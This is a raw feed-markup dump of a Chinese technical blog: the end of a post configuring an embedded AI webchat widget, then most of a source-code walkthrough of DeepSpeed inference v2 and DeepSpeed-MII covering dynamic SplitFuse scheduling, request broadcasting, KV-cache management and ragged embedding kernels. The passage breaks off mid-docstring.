自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat#conversation-options</span><br><span class="hljs-string">        conversationStarters: [</span><br><span class="hljs-string">          &#123;prompt: &#x27;哪款手机续航最长？&#x27;&#125;,</span><br><span class="hljs-string">          &#123;prompt: &#x27;你们有哪些手机型号？&#x27;&#125;,</span><br><span class="hljs-string">          &#123;prompt: &#x27;有折叠屏手机吗?&#x27;&#125;,</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;,</span><br><span class="hljs-string">      displayOptions: &#123; // 自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat#display-options</span><br><span class="hljs-string">        height: 600,</span><br><span class="hljs-string">      &#125;,</span><br><span class="hljs-string">      personaOptions: &#123; // 自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat#chat-personas</span><br><span class="hljs-string">        assistant: &#123;</span><br><span class="hljs-string">          name: &#x27;你好，我是你的 AI 助手&#x27;,</span><br><span class="hljs-string">          // AI 助手的图标</span><br><span class="hljs-string">          avatar: &#x27;https://img.alicdn.com/imgextra/i2/O1CN01Pda9nq1YDV0mnZ31H_!!6000000003025-54-tps-120-120.apng&#x27;,</span><br><span class="hljs-string">          tagline: &#x27;您可以尝试点击下方的快捷入口开启体验！&#x27;,</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;;</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">&lt;style&gt;</span><br><span class="hljs-string">  :root &#123;</span><br><span class="hljs-string">    /* webchat 工具栏的颜色 */</span><br><span class="hljs-string">    --webchat-toolbar-background-color: #1464E4;</span><br><span class="hljs-string">    /* webchat 工具栏文字和按钮的颜色 */</span><br><span class="hljs-string">    --webchat-toolbar-text-color: #FFF;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  /* webchat 对话框如果被遮挡，可以尝试通过 z-index、bottom、right 等设置来调整位置 */</span><br><span class="hljs-string">  .webchat-container &#123;</span><br><span class="hljs-string">    z-index: 100;</span><br><span class="hljs-string">    bottom: 10px;</span><br><span class="hljs-string">    right: 10px;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  /* webchat 的唤起按钮如果被遮挡，可以尝试通过 z-index、bottom、right 等设置来调整位置 */</span><br><span class="hljs-string">  .webchat-bubble-tip &#123;</span><br><span class="hljs-string">    z-index: 99;</span><br><span class="hljs-string">    bottom: 20px;</span><br><span class="hljs-string">    right: 20px;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&lt;/style&gt;`</span><br>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入探索 DeepSpeed（三）</title>
    <link href="/2024/06/12/2024-6-12-deepspeed/"/>
    <url>/2024/06/12/2024-6-12-deepspeed/</url>
    
    <content type="html"><![CDATA[<h1>DeepSpeed 高性能算子实现</h1><p><a href="https://dingfen.github.io/2024/05/15/2024-5-15-DeepSpeed/">上篇博客</a>的最后，<s>我发现 DeepSpeed inference v1 版本的算子代码似乎有精度问题。笔者在 A100 上用 DeepSpeed 推理模型，当打开 <code>replace_with_kernel_inject</code> 后，模型使用上面介绍的算子做推理后，其回答会变成一些乱码，或者是胡言乱语。本人怀疑是 v1 高性能算子代码实现有精度问题，进而导致模型回答混乱。</s></p><p>因此，这里不再介绍 DeepSpeed inference v1 版本的算子代码，我们来看看 inference V2 代码。</p><p>注：本篇博文的源码分析基于 DeepSpeed-0.14.2。</p><p>也许是因为 DeepSpeed inference v1 的实现不是很理想，微软很快又把 DeepSpeed inference v2 端了上来，这篇博客我们重点来关注一下 DeepSpeed inference v2 的内部实现，包括它的引擎，以及<a href="https://github.com/microsoft/DeepSpeed/tree/master/blogs/DeepSpeed-fastgen">它博客</a>中介绍的最大特点——动态分割融合（Dynamic SplitFuse）到底是如何实现的。</p><h2 id="DeepSpeed-inference-v2-示例">DeepSpeed inference v2 示例</h2><p>老规矩，开始之前，我们总要拿一个例子来跑一跑：</p><p>首先，按照 DeepSpeed 和 DeepSpeed-mii 的要求，需要安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install DeepSpeed DeepSpeed-mii<br></code></pre></td></tr></table></figure><p>然后，如果我们只是想临时跑一下模型看看它的输出，就可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> mii<br>pipe = mii.pipeline(<span class="hljs-string">&quot;mistralai/Mistral-7B-v0.1&quot;</span>)<br>response = pipe([<span class="hljs-string">&quot;DeepSpeed is&quot;</span>, <span class="hljs-string">&quot;Seattle is&quot;</span>], max_new_tokens=<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><p>然后就可以直接运行该程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Run on a single GPU</span><br>DeepSpeed --num_gpus 1 mii-example.py<br><br><span class="hljs-comment"># Run on multiple GPUs</span><br>DeepSpeed --num_gpus 2 mii-example.py<br></code></pre></td></tr></table></figure><p>如果要比较久地部署到服务器上，并方便客户端经常访问调用，那么代码会稍微复杂一点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> mii<br>client = mii.serve(<span class="hljs-string">&quot;mistralai/Mistral-7B-v0.1&quot;</span>)<br>response = client.generate([<span class="hljs-string">&quot;Deepspeed is&quot;</span>, <span class="hljs-string">&quot;Seattle is&quot;</span>], max_new_tokens=<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(response)<br><br><span class="hljs-comment"># or in another process</span><br>client = mii.client(<span class="hljs-string">&quot;mistralai/Mistral-7B-v0.1&quot;</span>)<br>response = client.generate(<span class="hljs-string">&quot;Deepspeed is&quot;</span>, max_new_tokens=<span class="hljs-number">128</span>)<br></code></pre></td></tr></table></figure><p>当我们把程序跑起来后，自然要想，它究竟是如何跑起来的。</p><h2 id="DeepSpeed-mii">DeepSpeed-mii</h2><h3 id="动态分割融合">动态分割融合</h3><p>为了充分释放 GPU 的性能，大模型会将若干个用户输入语句（prompt）合并，一起做批处理。然而，用户输入的 prompt 到大模型内的请求语句必然是长短不一的，此时常规做法是，模型通过填充（padding）的手段将请求中的输入 token 张量填充为相同的形状，再做进一步处理。但这样做还是浪费了不少 GPU 的性能，于是就有了连续批处理技术（Continuous batching）——将每个用户输入语句尽可能地“拼接”起来，补齐空白。</p><p><img src="/img/LLM/vllm_dynamic_batch_1.png" alt=""><br><img src="/img/LLM/vllm_dynamic_batch_2.png" alt="vllm 的动态批处理"></p><p>另一个大模型推理的性能瓶颈是，KV cache 占用空间过大。为此，vllm 提出了 KV cache 分块技术，借鉴操作系统中分页（paging）的概念，将本应该连续存放的 KV cache 做分块处理。具体操作是，vllm 将 KV cache 分成若干分固定长度的块，并通过映射表建立了逻辑 KV 块和物理 KV 块间的关联。处理时，逻辑块连续，但其映射到物理内存上的物理 KV 块可以分开存放，这样既可以减少内存碎片，也可以增加 KV block 共享的可能。</p><p><img src="/img/LLM/vllm_page_attn.webp" alt=""><br><img src="/img/LLM/vllm_page_attn_2.webp" alt=""></p><p>而 DeepSpeed 工程师进一步发现，prompt 阶段往往因处理的 token 过多而出现计算瓶颈，generation 阶段往往因处理的 token 过少（仅有 1）而陷入内存瓶颈。因此，它将上述两者技术结合，提出了动态分割融合（dynamic splitfuse）的优化技术。这是一种用于 prompt 阶段和 generation 阶段的 token 组合策略。<strong>具体操作是，通过从 prompt 阶段中取出部分 token 与 generation 阶段的 token 计算结合，使得模型可以保持一致的前向推理大小（forward size）</strong>。如此保持一定量的前推大小，可以使得 GPU 的计算性能和访存带宽都得到较好的发挥👇。</p><p><img src="/img/LLM/observation-prompt-v-flops.png" alt=""></p><p>为此，动态分割融合需要：</p><ul><li>将长 prompt 分解成一些小 token 块，并在多个 forward（迭代）中进行调度，只有在最后一次 forward 完成后才能执行生成。</li><li>将一些短 prompt 组合起来，以精确地填满目标 token 块。当然，有时一些短的 prompt 也可能被分解，以确保每个小块的长度需求被精确满足，保证前向大小（forward sizes）对齐。</li></ul><p>从实验中看，动态分割融合技术提升了以下性能指标：</p><ul><li><strong>更低的延迟</strong>： 由于长 prompt 不再需要极长的前向传递来处理，模型将提供更低的客户端延迟，因为该技术能充分发挥 GPU 性能，让它在同一时间内执行更多的前向传递。</li><li><strong>更高的吞吐量</strong>： 对短 prompt 的融合能使模型持续运行在高吞吐状态，其实逻辑和第一点一致。</li><li><strong>更低的波动和更好的一致性</strong>： 由于前向传递的大小一致，且前向传递大小是性能的主要决定因素，每个前向传递的延迟比其他系统更加一致。生成频率也是如此，因为DeepSpeed-FastGen不需要像其他先前的系统那样抢占或长时间处理 prompt ，因此延迟会更低。</li></ul><p>因此，与现有最先进的大模型推理系统相比，DeepSpeed-FastGen 既可以迅速、持续地处理 prompt 的 token，还能同时完成 token 的 generation。该技术不仅提高了系统利用率，也获得了更低的延迟和更高的吞吐量。</p><p><img src="/img/LLM/fastgen-overview-light.png" alt=""></p><p>图: 连续批处理策略的示意图。每个块显示一个前向推理的执行。箭头表示前向推理有一个或多个生成的 token 序列。vLLM 在一个前向推理中要么是 token generation 阶段，只产生一个 token，要么处理 prompt 阶段，处理一堆 token；这里 token 的生成抢占了 prompt 的处理。Orca 则以完整长度处理 prompt。DeepSpeed-FastGen 的动态分割融合则执行固定大小 token 块，对它们做前向推理。</p><h3 id="代码实现">代码实现</h3><p>我们从上面例子中的 <code>mii.pipeline</code> 出发：下面的介绍包括了 <code>mii.pipeline</code> 和基类 <code>RaggedBatchBase</code>  在拿到 batch 个 request 后的工作流程。</p><p><img src="/img/LLM/miipipeline.PNG" alt=""></p><p>我们将 pipeline 的调用代码分成三部分（红框标明），接下来分成三部分对代码做说明。</p><h4 id="第一部分">第一部分</h4><p>首先看第一个红框，这部分主要完成对用户输入 prompt 的切分、调度。它将输入的 prompts 全都导入到分词器 tokenizer 中，经过 <code>_put_request</code> 的编码后，包装产生 request。这个 request 包含了一切大模型推理需要的用户输入 tokens 和生成参数(generation config)，然后这些 requet 就会被放入队列中等待调度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_put_request</span>(<span class="hljs-params">self, uid: <span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>: <span class="hljs-built_in">str</span>, kwargs: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-literal">None</span>:<br>    self.result_queues[self.tid] = queue.Queue()<br>    input_tokens = self.tokenizer.encode(<span class="hljs-built_in">input</span>)<br>    request = self.make_request(self.tid, uid, input_tokens, kwargs)<br>    self.request_queue.put(request)<br></code></pre></td></tr></table></figure><p>那么这些 request 是如何被调度的？</p><p>很简单，对于那些已经将输入 token 解析完成的，处于生成阶段（generation 阶段）的 request，放入 <code>_schedule_token_gen</code> 中处理，对于还在解析输入（prompt阶段），放到 <code>_schedule_prompts</code> 中处理。prompt 的模型总入口是 <code>self.scheduled_requests</code>，要暂未被调度到的 request 会被放到 <code>self.buffer</code> 中缓存。</p><p><img src="/img/LLM/miischedulereq.PNG" alt=""></p><p>系统会优先处理生成阶段的 request，当出现 kv block 空缺位后，就会加入新的 request。而若 GPU 还有闲余空间（语句（sequence）空间）处理 prompt，那么会继续处理 prompt 阶段的 request。它会依照下面的函数严格限制每个 request 的长度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_kv_requirements</span>(<span class="hljs-params">self, sequence: DSSequenceDescriptor, max_new_tokens: <span class="hljs-built_in">int</span>,</span><br><span class="hljs-params">        max_new_blocks: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>]:<br>    total_tokens = sequence.seen_tokens + max_new_tokens<br>    req_blocks = ceil_div(total_tokens, self.attn.kv_block_size)<br>    block_lim = req_blocks - sequence.cur_allocated_blocks<br>    <span class="hljs-keyword">if</span> block_lim &lt;= max_new_blocks:<br>        <span class="hljs-keyword">return</span> max_new_tokens, block_lim<br>    token_capacity = (max_new_blocks +<br>        sequence.cur_allocated_blocks) * self.attn.kv_block_size - sequence.seen_tokens<br></code></pre></td></tr></table></figure><p><img src="/img/LLM/miischedulepro.PNG" alt=""></p><h4 id="第二部分">第二部分</h4><p>第二个红框是模型的执行部分，Rank 1-n 的节点仅负责 generate，而 Rank 0 要考虑的就多了：他不仅需要运行 generate，还需要在最后管理释放 requset，输出 response，在最后让 Rank 1-n 节点退出释放。</p><p>先来看一下 <code>generate()</code> 函数，它负责 token 的生成，因此其中的实现对于我们了解 deepspeed inference 如何运作相当重要。</p><p><img src="/img/LLM/miigenerate.png" alt=""></p><ol><li><code>_bcast_requests</code> 将 req 广播。<br>a. <code>RaggedBatchBase</code> 内部将多个 GPU 节点用 <a href="https://zeromq.org/languages/python/">ZeroMQ</a> 的高性能异步消息库连接起来。<br>b. 在 <code>_bcast_requests</code> 函数中，Rank 0 节点负责将所有的 <code>self.scheduled_requests</code> 中的 req 转成 json 数据格式，再发给其他 GPU 节点。其他节点则负责接收这些 req。<br>c. 此外，<code>_bcast_requests(Force=True)</code> 函数在所有 req 处理完毕后会再次被 Rank 0 节点调用，此时发送的 req 其实是空的。但这操作并非多余，这是通知其他 Rank 节点要及时退出释放资源。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_bcast_requests</span>(<span class="hljs-params">self, force=<span class="hljs-literal">False</span></span>) -&gt; RequestBatch:<br>    <span class="hljs-keyword">if</span> self.is_rank_0:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.scheduled_requests <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> force:<br>            <span class="hljs-keyword">return</span> self.scheduled_requests<br>        <span class="hljs-comment"># Rank 0 gets batch of requests and broadcasts to other ranks</span><br>        data_dicts = self.scheduled_requests.to_msg_dicts()<br>        json_data = ujson.dumps(data_dicts)<br>        self.socket.send_string(json_data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            json_data = self.socket.recv_string()<br>            data_dicts = ujson.loads(json_data)<br>            self.scheduled_requests = RequestBatch.from_msg_dicts(data_dicts)<br>        <span class="hljs-keyword">except</span> zmq.Again:<br>            self.scheduled_requests = RequestBatch()<br>    <span class="hljs-keyword">return</span> self.scheduled_requests<br></code></pre></td></tr></table></figure><ol start="2"><li><code>flush</code> 函数将 <code>self.scheduled_requests</code> 中要重刷的（已经完成生成的）语句资源都释放掉，包括他的 KV Block Cache 等。这方面的代码涉及到 DeepSpeed 内。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">flush_sequence</span>(<span class="hljs-params">self, uid: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># Free all resources associated with the given sequence id.</span><br>    seq = self._seqs[uid]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.n_kv_cache_groups):<br>        self._kv_cache.free(seq.all_block_ids(cache_group=i), cache_group=i)<br><br>    self._tracking_allocator.free(seq.tracking_id)<br>    <span class="hljs-keyword">del</span> self._seqs[uid]<br></code></pre></td></tr></table></figure><ol start="3"><li><code>put</code> 函数将未处理完的 token 加入到推理引擎中，然后执行 forward 前推动作。具体的运作步骤参考下文的推理引擎内容。</li><li>启动 logits 处理。<br>a. 到第三步，其余 Rank 的工作就已经完成了，但对于 Rank 0，还需要做剩下的 4 5 6 7 步<br>b. Rank 0 在这里会调用 logit_processor 和 sampler 来选择具体的 token 值。相关代码在 deepspeed.mii.batching.postprocess 中可以找到</li><li><code>reset_scheduler_bookkeeping</code> 对 <code>self.scheduled_requests</code> 清空！大家可能会奇怪，之前我们几乎所有的操作都是为了或者说基于这个 <code>scheduled_requests</code> 而去做的，现在说清空就清空是不是有点前功尽弃的感觉了。emm 确实，但所谓不破不立吧，有时也许做好的办法就是打破重来。</li><li>Rank 0 需要检查是否完成生成。对于已经完成了的 req，就会从运行的 <code>scheduled_requests.requests_to_run</code> 列表中删去</li><li>调用 <code>schedule_request()</code> （参考第一部分），以目前正在运行的 <code>scheduled_requests.requests_to_run</code> 为基础，建立一个新的调度 req 列。</li></ol><h4 id="第三部分">第三部分</h4><p>当程序执行完所有的 batch 的生成词后，需要将最终的结果返回，如果需要的话，还要将 output 广播到所有的 Rank 节点上。</p><p>这其中，<code>get_response</code> 函数负责调用 tokenizer 解码，生成字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_response</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>, Response]:<br>    result = self.result_queues[self.tid].get()<br>    uid = result[<span class="hljs-number">0</span>]<br>    generated_tokens = self.tokenizer.decode(result[<span class="hljs-number">1</span>])<br>    response = self.make_response(generated_tokens, result[<span class="hljs-number">2</span>], result[<span class="hljs-number">3</span>], result[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">return</span> uid, response<br></code></pre></td></tr></table></figure><p><code>bcast_responses</code> 则负责将回答广播到所有节点上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_bcast_responses</span>(<span class="hljs-params">self, responses: <span class="hljs-type">List</span>[Response]</span>) -&gt; <span class="hljs-type">List</span>[Response]:<br>    <span class="hljs-keyword">if</span> self.is_rank_0:<br>        data_dicts = [r.to_msg_dict() <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> responses]<br>        json_data = ujson.dumps(data_dicts)<br>        self.socket.send_string(json_data)<br>    <span class="hljs-keyword">else</span>:<br>        json_data = self.socket.recv_string()<br>        data_dicts = ujson.loads(json_data)<br>        responses = [Response.from_msg_dict(msg) <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> data_dicts]<br>    <span class="hljs-keyword">return</span> responses<br></code></pre></td></tr></table></figure><h2 id="推理引擎v2">推理引擎v2</h2><p>与第一版推理引擎相比，第二版推理引擎的代码要简单易懂的多（这就是代码重构带来的后发优势）。<code>InferenceEngineV2</code> 有三个成员：推理config、模型本身和推理状态管理器，可谓简单清楚直观。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">InferenceEngineV2</span>:<br>    _config: RaggedInferenceEngineConfig<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Configuration of the inference engine.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    _model: DSInferenceModelBase<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Inference model supporting ragged inference.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    _state_manager: DSStateManager<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Persistent state manager for sequences and KV-cache.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>而且，<code>InferenceEngineV2</code> 支持类似 vllm 中的动态批处理功能（dynamic batching）（有时也称为 continuous batching）。为了方便介绍下文的嵌入操作，这里先提一下模型是如何将长短不一的各个输入query统一处理的，并实现 continuous batching 的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">self._batch = RaggedBatchWrapper(self._config.state_manager)<br></code></pre></td></tr></table></figure><p>首先，在构建时，它使用了 <code>RaggedBatchWrapper</code> 包装了必要的数据结构，包括 input ids，tokens 和 seqs 的相关信息。然后，<code>put()</code> 将输入的批处理 sequence 逐个插入到 <code>_batch</code> 内：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">self._batch.clear()<br><span class="hljs-comment"># 做推理前的准备工作，创造或拿到对应 seq，分配 KV Block，插入 token 等</span><br><span class="hljs-keyword">for</span> uid, tokens <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(batch_uids, batch_tokens):<br>    host_seq_desc = self._state_manager.get_or_create_sequence(uid)<br>    self._model.maybe_allocate_kv(host_seq_desc, tokens.numel())<br>    host_seq_desc.pre_forward(tokens.numel())<br>    self._batch.insert_sequence(host_seq_desc, tokens, do_checks=do_checks)<br><br><span class="hljs-comment"># 做 raggedBatch 相关数据的更新</span><br>self._batch.finalize()x<br><br><span class="hljs-comment"># Prep all data structures for the actual forward (in anticipation of CG in the future)</span><br><span class="hljs-comment"># and also to amortize some of the costs in a more straightforward way.</span><br>self._model.prepare_batch(self._batch)<br><br><span class="hljs-comment"># 做推理，计算出 logits 张量</span><br>logits = self._model.forward(self._batch)<br><br><span class="hljs-comment"># We return one set of logits per sequence in the batch (saves cost on unembedding)</span><br><span class="hljs-keyword">assert</span> logits.shape[<span class="hljs-number">0</span>] == self._batch.current_sequences<br></code></pre></td></tr></table></figure><p>在设计使用 <code>insert_sequence</code> 函数时，DeepSpeed 的工程师发现，将句子逐个插入到列表中会导致内存访问因碎片过多而过慢，因此他们的做法是先插入所有的句子到一个临时列表中，然后再使用 <code>finalize()</code> 函数将全体数据更新到 <code>RaggedBatchWrapper</code> 内的最终目前数据结构中。然后，<code>prepare_batch</code> 准备所有的用于前推数据结构，并做摊还分析。</p><hr><p>现在，我们来看看 DeepSpeed 推理 v2 版本有哪些新花样。还是从 llama2 模型出发，先看看整个模型架构中，高性能 kernel 的使用情况：</p><p><img src="/img/LLM/llama2inferencemodel.png" alt=""></p><h2 id="参差不齐的嵌入操作">参差不齐的嵌入操作</h2><p>为了充分释放 GPU 的性能，模型会将若干个用户输入的请求做批处理。然而，用户输入到大模型内的请求语句必然是长短不一的，此时常规做法是，模型通过填充（padding）的手段将请求中的输入张量填充为相同的形状，再做进一步处理。但这样做还是浪费了不少 GPU 的性能，为此，DeepSpeed 提供了类似 vllm 中的动态批处理功能（dynamic batching）。它将同一模型执行的多个请求组合在一起，并且不需要填充短请求，就可直接进行批处理，从而获得更大的吞吐量。</p><p><img src="/img/LLM/vllm_dynamic_batch_1.png" alt=""><br><img src="/img/LLM/vllm_dynamic_batch_2.png" alt="vllm 的动态批处理"></p><p>因为缺少了填充对齐，因此取名“参差不齐的嵌入操作”，英文名 RaggedEmbedding，这恰好对应了类名 <code>DSRaggedEmbedding</code>。而要想充分理解 <code>DSRaggedEmbedding</code> 的实现，我们必须从与它密切相关的类 <code>RaggedBatchWrapper</code> 和 <code>RaggedEmbeddingKernel</code> 开始聊起。</p><h3 id="RaggedBatchWrapper">RaggedBatchWrapper</h3><p>虽然这类只是一个 wrapper，仅封装了相关的值而已。但我觉得这内部的值可以很好地帮助我们理解动态批处理的实现细节。因此在这里展开讲讲。</p><p>为了让更清楚明白，举一个简单的例子：假设现在模型正在处理 8 个 token，这 8 个 token 分别位于 3 个 sequence 中：</p><p><img src="/img/LLM/raggedEmbedding.png" alt="RaggedBatch Embedding所需要的数据结构"></p><p>其中，sequence 指的是每个请求读入的句子，seq_lens 表示一个 batch 中所有的句子。<code>RaggedBatchWrapper</code> 的成员还有：</p><ul><li><code>input_ids</code> 用户输入的句子，被切分、数字化后，成为一列整数列</li><li><code>_batch_metadata_storage</code> 存放正在处理的句子数量和 tokens 数量，在本例中其值为 <code>(sum(seq_lens), len(seq_lens))</code></li><li><code>_token_to_seq_storage</code> 存放了 token_id 映射到 seq_id 的表，通过它每个 token 可以找到自己的 seq。</li><li><code>_inflight_seq_descriptor</code> 存放了每个正在处理的句子的详细信息，包括开始 token 位置，总token 数，目前看见的 token 等。</li><li><code>_kv_ptrs</code>  指向 GPU 缓存中的 KV-blocks 指针列表。</li></ul><h3 id="RaggedEmbeddingKernel">RaggedEmbeddingKernel</h3><p>下面就是 <code>DSRaggedEmbedding</code> 的前推函数：可见它直接调用了 <code>RaggedEmbeddingKernel</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">self._ragged_embed = RaggedEmbeddingKernel(self._config.residual_dtype, torch.int32,<br>                                           self._config.embedding_dim)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, ragged_batch: RaggedBatchWrapper, word_embeddings: torch.Tensor,</span><br><span class="hljs-params">            position_embeddings: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span></span>) -&gt; torch.Tensor:<br>    output = empty_from(self._output, (ragged_batch.tensor_toks, self._config.embedding_dim))<br>    self._ragged_embed(output, ragged_batch, word_embeddings,<br>                       position_embed_weight=position_embeddings,<br>                       position_embed_offset=self.embed_offset)<br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>而 <code>RaggedEmbeddingKernel</code> 是对 CUDA 实现的算子的一个 python 包装，封装了 <code>ragged_embed</code> C++ 函数的实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RaggedEmbeddingKernel</span>(<span class="hljs-title class_ inherited__">DSKernelBase</span>):<br>    inf_module = RaggedOpsBuilder().load()<br>    self.kernel = inf_module.ragged_embed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, embedded_tokens: torch.Tensor, ragged_wrapper: RaggedBatchWrapper,</span><br><span class="hljs-params">             embedding_weight: torch.Tensor, position_embed_weight: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">             position_embed_offset: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>) -&gt; torch.Tensor:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        embedded_tokens (torch.Tensor): Output tensor of shape [num_tokens, embed_dim]</span><br><span class="hljs-string">        ragged_wrapper (RaggedBatchWrapper): Wrapper for the ragged 